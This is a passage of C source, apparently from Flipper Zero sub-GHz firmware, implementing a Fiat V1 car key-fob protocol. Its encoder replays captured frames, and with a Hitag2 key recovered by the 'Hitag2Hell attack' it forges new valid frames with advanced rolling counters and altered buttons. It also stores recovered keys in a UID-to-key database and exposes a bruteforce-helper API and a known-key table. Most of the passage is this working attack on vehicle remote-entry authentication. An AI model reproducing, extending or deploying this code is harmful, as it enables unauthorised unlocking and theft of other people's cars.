            // app-supplied "Cnt", so OK advances with the scene like every other
            // key; the frame is re-encoded (not a raw replay) because the key is
            // available.
            button = original_btn;
            break;
        }
    }

    // [ROLLING_CNT] Forward-encode the NEXT counter (like VAG/PSA) so the
    // transmitter UI shows an incrementing counter on each OK/D-pad press. Only
    // meaningful when a Hitag2 key is available (we re-encode a fresh valid
    // frame); the no-key branch is replay-only and must not advance. The advanced
    // Raw frame is written back to the fff below so the decoder re-derives the new
    // counter on the UI refresh.
    if(key_loaded) {
        uint32_t mult = furi_hal_subghz_get_rolling_counter_mult();
        if(mult == 0U) mult = 1U;
        control = (control + mult) & 0x03FFU;
    }

    control &= 0x03FFU;
    button &= 0x0FU;
    instance->generic.serial = serial;
    instance->generic.btn = (uint8_t)button;
    instance->generic.cnt = control;

    if(key_loaded) {
        // KEY PRESENT: recompute the hop for the (possibly D-pad changed) button
        // and counter, then rebuild the raw frame. For the captured button this
        // reproduces the captured hop byte-identically; for a changed button /
        // advanced counter it produces a fresh valid frame.
        instance->hop = fiat_v1_bcm_generate_authenticator(
            serial, (uint8_t)button, (uint16_t)control, instance->hitag2_key, instance->epoch);
        instance->generic.data = ((uint64_t)serial << 32U) | instance->hop;
        instance->generic.data_count_bit = FIAT_V1_LOGICAL_BITS;

        fiat_v1_build_raw(
            instance->raw_data,
            serial,
            (uint8_t)button,
            (uint16_t)control,
            instance->hop,
            instance->tail_bits);
        instance->frame_xor = instance->raw_data[12];

        // [ROLLING_CNT] Persist the advanced frame so the UI refresh
        // (decoder deserialize reads "Raw") shows the incremented counter, and the
        // next TX continues from here.
        flipper_format_rewind(flipper_format);
        flipper_format_insert_or_update_hex(
            flipper_format, FIAT_V1_RAW_FIELD, instance->raw_data, FIAT_V1_WIRE_BYTES);
        flipper_format_rewind(flipper_format);
        uint32_t cnt_store = control;
        flipper_format_insert_or_update_uint32(flipper_format, "Cnt", &cnt_store, 1);
    } else {
        // NO KEY: byte-identical REPLAY of the captured frame. The key is only
        // needed to synthesize the NEXT signal (changed button / advanced
        // counter); the already-captured frame is stored in full (the 13-byte
        // Raw field) so we can re-send it exactly as decoded without any crypto.
        // Requires a valid Raw field; without it there is nothing to replay.
        if(!fiat_v1_frame_valid(raw_from_file)) {
            FURI_LOG_E(
                TAG,
                "TX: no Hitag2 Key and no replayable Raw frame (uid=%08lX)",
                (unsigned long)serial);
            return SubGhzProtocolStatusErrorParserOthers;
        }
        memcpy(instance->raw_data, raw_from_file, FIAT_V1_WIRE_BYTES);
        instance->hop = fiat_v1_hop(instance->raw_data);
        instance->frame_xor = instance->raw_data[12];
        instance->generic.btn = instance->raw_data[6] >> 4U;
        instance->generic.data = ((uint64_t)serial << 32U) | instance->hop;
        instance->generic.data_count_bit = FIAT_V1_LOGICAL_BITS;
        FURI_LOG_I(
            TAG,
            "TX(replay) UID:%08lX (no key, replaying captured frame)",
            (unsigned long)serial);
    }

    uint32_t repeat = FIAT_V1_ENC_DEFAULT_REPEAT;
    flipper_format_rewind(flipper_format);
    flipper_format_read_uint32(flipper_format, "Repeat", &repeat, 1);
    instance->encoder.repeat = (repeat == 0U) ? FIAT_V1_ENC_DEFAULT_REPEAT : (size_t)repeat;

    instance->encoder.upload = malloc(FIAT_V1_UPLOAD_CAPACITY * sizeof(LevelDuration));
    if(!fiat_v1_encoder_build_upload(instance)) {
        return SubGhzProtocolStatusErrorParserOthers;
    }
    instance->encoder.is_running = true;

    FURI_LOG_I(
        TAG,
        "TX UID:%08lX Btn:%02lX Cnt:%03lX Auth:%08lX Epoch:%05lX XOR:%02X",
        (unsigned long)serial,
        (unsigned long)button,
        (unsigned long)control,
        (unsigned long)instance->hop,
        (unsigned long)instance->epoch,
        instance->frame_xor);

    return SubGhzProtocolStatusOk;
}

void* subghz_protocol_decoder_fiat_v1_alloc(SubGhzEnvironment* environment) {
    UNUSED(environment);
    SubGhzProtocolDecoderFiatV1* instance = calloc(1, sizeof(SubGhzProtocolDecoderFiatV1));
    furi_check(instance);
    instance->base.protocol = &fiat_v1_protocol;
    instance->generic.protocol_name = instance->base.protocol->name;
    subghz_protocol_decoder_fiat_v1_reset(instance);
    return instance;
}

void subghz_protocol_decoder_fiat_v1_reset(void* context) {
    furi_check(context);
    SubGhzProtocolDecoderFiatV1* instance = context;

    memset(instance->raw_data, 0, sizeof(instance->raw_data));
    memset(instance->last_raw_data, 0, sizeof(instance->last_raw_data));
    instance->decoder.parser_step = FiatV1DecoderStepReset;
    instance->decoder.decode_data = 0U;
    instance->decoder.decode_count_bit = 0U;
    instance->last_raw_valid = false;
    instance->generic.data = 0U;
    instance->generic.data_count_bit = 0U;
    instance->generic.serial = 0U;
    instance->generic.btn = 0U;
    instance->generic.cnt = 0U;
    instance->uid = 0U;
    instance->hop = 0U;
    instance->family = 0U;
    instance->tail_bits = FIAT_V1_DEFAULT_TAIL_BITS;
    instance->frame_xor = 0U;
    instance->hitag2_key_valid = false;
    instance->hitag2_epoch = 0U;
    memset(instance->hitag2_key, 0, sizeof(instance->hitag2_key));
    fiat_v1_clear_all_cells(instance);
}

void subghz_protocol_decoder_fiat_v1_feed(void* context, bool level, uint32_t duration) {
    furi_check(context);
    SubGhzProtocolDecoderFiatV1* instance = context;

    switch(instance->decoder.parser_step) {
    case FiatV1DecoderStepReset:
        if(fiat_v1_duration_is_pulse(duration)) {
            fiat_v1_clear_all_cells(instance);
            instance->decoder.parser_step = FiatV1DecoderStepData;
            (void)fiat_v1_feed_data_pulse(instance, level, duration);
        }
        break;

    case FiatV1DecoderStepData:
        if(!fiat_v1_feed_data_pulse(instance, level, duration)) {
            instance->decoder.parser_step = FiatV1DecoderStepReset;
        }
        break;
    }
}

uint8_t subghz_protocol_decoder_fiat_v1_get_hash_data(void* context) {
    furi_check(context);
    SubGhzProtocolDecoderFiatV1* instance = context;
    SubGhzBlockDecoder decoder = {
        .decode_data = instance->generic.data,
        .decode_count_bit = 64U,
    };
    return subghz_protocol_blocks_get_hash_data(&decoder, 8U) ^
           (uint8_t)(instance->generic.cnt >> 8U) ^ (uint8_t)instance->generic.cnt ^
           instance->generic.btn ^ instance->frame_xor;
}

SubGhzProtocolStatus subghz_protocol_decoder_fiat_v1_serialize(
    void* context,
    FlipperFormat* flipper_format,
    SubGhzRadioPreset* preset) {
    furi_check(context);
    SubGhzProtocolDecoderFiatV1* instance = context;

    SubGhzProtocolStatus ret =
        subghz_block_generic_serialize(&instance->generic, flipper_format, preset);
    if(ret != SubGhzProtocolStatusOk) {
        return ret;
    }

    flipper_format_rewind(flipper_format);
    flipper_format_insert_or_update_hex(
        flipper_format, FIAT_V1_RAW_FIELD, instance->raw_data, FIAT_V1_WIRE_BYTES);

    uint32_t hop = instance->hop;
    uint32_t frame_xor = instance->frame_xor;
    uint32_t tail_bits = instance->tail_bits;
    if(!flipper_format_write_uint32(flipper_format, FIAT_V1_HOP_FIELD, &hop, 1) ||
       !flipper_format_write_uint32(flipper_format, FIAT_V1_XOR_FIELD, &frame_xor, 1) ||
       !flipper_format_write_uint32(flipper_format, FIAT_V1_TAIL_BITS_FIELD, &tail_bits, 1)) {
        return SubGhzProtocolStatusErrorParserOthers;
    }

    uint32_t serial_val = instance->generic.serial;
    uint32_t btn_val = instance->generic.btn;
    uint32_t cnt_val = instance->generic.cnt;
    if(!flipper_format_write_uint32(flipper_format, "Serial", &serial_val, 1) ||
       !flipper_format_write_uint32(flipper_format, "Btn", &btn_val, 1) ||
       !flipper_format_write_uint32(flipper_format, "Cnt", &cnt_val, 1)) {
        return SubGhzProtocolStatusErrorParserOthers;
    }

    if(instance->hitag2_key_valid) {
        uint32_t epoch = instance->hitag2_epoch & 0x3FFFFUL;
        if(!flipper_format_insert_or_update_hex(
               flipper_format, FIAT_V1_HITAG2_KEY_FIELD, instance->hitag2_key, 6U) ||
           !flipper_format_write_uint32(
               flipper_format, FIAT_V1_HITAG2_EPOCH_FIELD, &epoch, 1)) {
            return SubGhzProtocolStatusErrorParserOthers;
        }

        // [ARF_PORT 2026-10-26] Also remember this key in the global UID->key DB
        // (ported from doctor-firmware), so a future capture of the same car
        // resolves instantly via the lookup in fiat_v1_verify_hitag2_key().
        // Best-effort: failure to write the DB does not fail the save.
        if(instance->uid != 0U && instance->uid != UINT32_MAX) {
            hitag2_key_db_save_key(instance->uid, instance->hitag2_key, epoch);
        }
    }

    return SubGhzProtocolStatusOk;
}

static void fiat_v1_load_hitag2_key(
    SubGhzProtocolDecoderFiatV1* instance,
    FlipperFormat* flipper_format) {
    uint8_t key[6] = {0};
    flipper_format_rewind(flipper_format);
    if(!flipper_format_read_hex(flipper_format, FIAT_V1_HITAG2_KEY_FIELD, key, 6U)) {
        return;
    }

    uint32_t epoch = 0U;
    flipper_format_rewind(flipper_format);
    if(flipper_format_read_uint32(flipper_format, FIAT_V1_HITAG2_EPOCH_FIELD, &epoch, 1U)) {
        epoch &= 0x3FFFFUL;
    } else {
        epoch = 0U;
    }

    memcpy(instance->hitag2_key, key, sizeof(instance->hitag2_key));
    instance->hitag2_epoch = epoch;
    instance->hitag2_key_valid = fiat_v1_key_matches(
        instance->uid,
        instance->generic.btn,
        (uint16_t)(instance->generic.cnt & 0x03FFU),
        instance->hop,
        key,
        epoch);
}

SubGhzProtocolStatus
    subghz_protocol_decoder_fiat_v1_deserialize(void* context, FlipperFormat* flipper_format) {
    furi_check(context);
    SubGhzProtocolDecoderFiatV1* instance = context;

    SubGhzProtocolStatus ret = subghz_block_generic_deserialize_check_count_bit(
        &instance->generic, flipper_format, subghz_protocol_fiat_v1_const.min_count_bit_for_found);
    if(ret != SubGhzProtocolStatusOk) {
        return ret;
    }
    if(instance->generic.data_count_bit != FIAT_V1_LOGICAL_BITS) {
        return SubGhzProtocolStatusErrorValueBitCount;
    }

    flipper_format_rewind(flipper_format);
    if(flipper_format_read_hex(
           flipper_format, FIAT_V1_RAW_FIELD, instance->raw_data, FIAT_V1_WIRE_BYTES)) {
        if(!fiat_v1_frame_valid(instance->raw_data)) {
            return SubGhzProtocolStatusErrorParserOthers;
        }
        fiat_v1_decode_fields(instance);
        fiat_v1_load_hitag2_key(instance, flipper_format);
        return SubGhzProtocolStatusOk;
    }

    instance->generic.serial = (uint32_t)(instance->generic.data >> 32U);
    instance->hop = (uint32_t)instance->generic.data;
    instance->family = 0x01U;
    instance->uid = instance->generic.serial;
    instance->tail_bits = FIAT_V1_DEFAULT_TAIL_BITS;

    uint32_t value = 0U;
    if(flipper_format_read_uint32(flipper_format, "Serial", &value, 1)) {
        instance->generic.serial = value;
    }
    if(flipper_format_read_uint32(flipper_format, "Btn", &value, 1)) {
        instance->generic.btn = (uint8_t)value;
    }
    if(flipper_format_read_uint32(flipper_format, "Cnt", &value, 1)) {
        instance->generic.cnt = value;
    }
    if(flipper_format_read_uint32(flipper_format, FIAT_V1_HOP_FIELD, &value, 1)) {
        instance->hop = value;
    }
    if(flipper_format_read_uint32(flipper_format, FIAT_V1_XOR_FIELD, &value, 1)) {
        instance->frame_xor = (uint8_t)value;
    }
    if(flipper_format_read_uint32(flipper_format, FIAT_V1_TAIL_BITS_FIELD, &value, 1)) {
        instance->tail_bits = (uint8_t)(value & 0x03U);
    }

    fiat_v1_rebuild_raw(instance);
    if(!fiat_v1_frame_valid(instance->raw_data)) {
        return SubGhzProtocolStatusErrorParserOthers;
    }
    fiat_v1_decode_fields(instance);
    fiat_v1_load_hitag2_key(instance, flipper_format);
    return SubGhzProtocolStatusOk;
}

void subghz_protocol_decoder_fiat_v1_get_string(void* context, FuriString* output) {
    furi_check(context);
    SubGhzProtocolDecoderFiatV1* instance = context;

    // Key line: the 6-byte hitag2 key recovered by the Hitag2Hell attack, or
    // "?" when it has not been recovered yet (capture without a matching key).
    if(instance->hitag2_key_valid) {
        // [BUGFIX UI] Re-derive the displayed button from the current D-pad
        // selection. This get_string is what draws the transmitter UI, so it
        // must reflect subghz_custom_btn_get() (like psa.c/star_line.c),
        // otherwise the label always showed the captured button. The D-pad is
        // only meaningful when the Hitag2 key is available (the encoder can only
        // forward-encode a changed button then), so we only remap in this branch.
        subghz_custom_btn_set_max(4);
        uint8_t display_btn = instance->generic.btn;
        uint8_t custom = subghz_custom_btn_get();
        if(custom != SUBGHZ_CUSTOM_BTN_OK) {
            display_btn = fiat_v1_custom_to_btn(custom, instance->generic.btn);
        }
        furi_string_cat_printf(
            output,
            "%s %ubit\r\n"
            "Key:%02X%02X%02X%02X%02X%02X\r\n"
            "SN:0x%lX Btn:[%s]\r\n"
            "Cnt:%03lX\r\n",
            instance->generic.protocol_name,
            FIAT_V1_LOGICAL_BITS,
            instance->hitag2_key[0],
            instance->hitag2_key[1],
            instance->hitag2_key[2],
            instance->hitag2_key[3],
            instance->hitag2_key[4],
            instance->hitag2_key[5],
            (unsigned long)instance->generic.serial,
            fiat_v1_button_name(display_btn),
            (unsigned long)instance->generic.cnt);
    } else {
        furi_string_cat_printf(
            output,
            "%s %ubit\r\n"
            "Key:?\r\n"
            "SN:0x%lX Btn:[%s]\r\n"
            "Cnt:%03lX\r\n",
            instance->generic.protocol_name,
            FIAT_V1_LOGICAL_BITS,
            (unsigned long)instance->generic.serial,
            fiat_v1_button_name(instance->generic.btn),
            (unsigned long)instance->generic.cnt);
    }
}

// [HITAG2_BF] Public API for Hitag2 bruteforce helper
uint32_t subghz_protocol_fiat_v1_compute_auth(
    uint32_t uid,
    uint8_t button,
    uint16_t control,
    const uint8_t key[6],
    uint32_t epoch) {
    return fiat_v1_bcm_generate_authenticator(uid, button, control, key, epoch);
}

bool subghz_protocol_fiat_v1_verify_key(
    uint32_t uid,
    uint8_t button,
    uint16_t control,
    uint32_t hop,
    const uint8_t key[6],
    uint32_t epoch) {
    return fiat_v1_key_matches(uid, button, control, hop, key, epoch);
}

const uint8_t (*subghz_protocol_fiat_v1_get_known_keys(void))[6] {
    return fiat_v1_known_keys;
}
